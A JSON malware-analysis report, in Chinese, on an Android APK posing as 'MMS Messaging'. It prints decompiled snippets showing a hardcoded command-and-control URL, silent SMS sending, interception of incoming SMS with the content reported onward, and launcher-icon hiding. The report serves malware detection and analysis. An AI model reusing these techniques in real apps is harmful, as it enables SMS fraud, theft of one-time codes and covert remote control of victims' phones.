@@ -1,0 +1,139 @@
+{
+  "APK信息": {
+    "文件名": "124675ce63027ceea0a52bf89a813ad2a6b0cc3e6ca55329831d0099af2307d9.apk",
+    "sha256": "124675ce63027ceea0a52bf89a813ad2a6b0cc3e6ca55329831d0099af2307d9",
+    "包名": "exts.denmark",
+    "应用名": "MMS Messaging",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 210.2
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\Constants;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static final String ADMIN_LINK = \"http://37.1.205.193/?action=command\";",
+          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class Constants {\n>>>     public static final String ADMIN_LINK = \"http://37.1.205.193/?action=command\";\n      public static final String APP_ID = \"APP_ID\";\n      public static final String CARD_SENT = \"CARD_SENT\";\n      public static final String INSTALL_ID = \"1\";",
+          "behavior_description": "代码硬编码了C2服务器的IP地址链接，并带有action=command参数用于接收远程控制指令。结合同文件中的INTERCEPTING_ENABLED（拦截启用）和LOCK_ENABLED（锁定启用）等配置项，表明该应用会定期（REQUEST_INTERVAL=60秒）向该C2服务器发起请求以获取并执行恶意指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\utils\\Utils;",
+          "method_signature": "for(int i = 0; i < parts.size()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "sms.sendMultipartTextMessage(number, null, parts, sents, null);\nsms.sendTextMessage(number, null, text, PendingIntent.getBroadcast(context, 0, sentIntent2, 134217728), null);",
+          "malicious_code_snippet_context": "                      sentIntent.putExtra(\"text\", parts.get(i));\n                      sents.add(PendingIntent.getBroadcast(context, 0, sentIntent, 134217728));\n                  }\n>>>                 sms.sendMultipartTextMessage(number, null, parts, sents, null);\n>>>                 return;\n              }\n              Intent sentIntent2 = new Intent(Starter.ACTION_REPORT);\n              sentIntent2.putExtra(\"number\", number);",
+          "behavior_description": "该代码通过 SmsManager 的 sendTextMessage() 和 sendMultipartTextMessage() 静默发送短信，无需用户交互或系统UI确认。短信内容(text)和目标号码(number)作为参数传入，结合 ACTION_REPORT 回调机制，表明短信内容可能来自远程C2服务器指令或恶意构造的欺诈文本。此行为可导致用户被订阅高额付费服务、向通讯录联系人发送钓鱼短信，或作为C2通信通道隐蔽上报窃取的数据。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lexts\\denmark\\MessageReceiver;",
+          "method_signature": "if(needToInterceptIncoming)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\nIntent start = new Intent(context, SendService.class);\nstart.setAction(SendService.REPORT_INCOMING_MESSAGE);\nstart.putExtra(\"number\", sender);\nstart.putExtra(\"text\", text);\ncontext.startService(start);\nif (needToInterceptIncoming) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "          Map<String, String> messages = retrieveMessages(intent);\n          for (String sender : messages.keySet()) {\n              String text = messages.get(sender);\n>>>             boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\n>>>             Intent start = new Intent(context, (Class<?>) SendService.class);\n>>>             start.setAction(SendService.REPORT_INCOMING_MESSAGE);\n>>>             start.putExtra(\"number\", sender);\n>>>             start.putExtra(\"text\", text);\n>>>             context.startService(start);\n>>>             if (needToInterceptIncoming) {\n>>>                 abortBroadcast();\n>>>             }\n          }\n      }\n  ",
+          "behavior_description": "该代码在BroadcastReceiver中接收短信广播，从Intent中提取PDU解析出发送方号码和短信内容，随后将短信内容通过启动SendService上报（可能转发至C2服务器或攻击者），并在拦截开关开启时调用abortBroadcast()中止广播继续传递，导致短信无法到达系统收件箱和其他应用，用户对被拦截的短信毫无感知。这种行为常用于窃取短信验证码/OTP、隐藏银行扣款通知或接收C2指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\Main;",
+          "method_signature": "hide()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "ComponentName componentName = new ComponentName(this, Main.class);\npackageManager.setComponentEnabledSetting(componentName, 2, 1);",
+          "malicious_code_snippet_context": "  \n      private void hide() {\n          PackageManager packageManager = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n>>>         packageManager.setComponentEnabledSetting(componentName, 2, 1);\n      }\n  }",
+          "behavior_description": "代码通过获取 PackageManager 实例，构造指向自身主 Activity (Main.class) 的 ComponentName，并调用 setComponentEnabledSetting 将其设置为禁用状态 (参数2对应 COMPONENT_ENABLED_STATE_DISABLED)，实现应用图标在启动器中隐藏，以便在后台隐蔽运行规避用户查杀。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
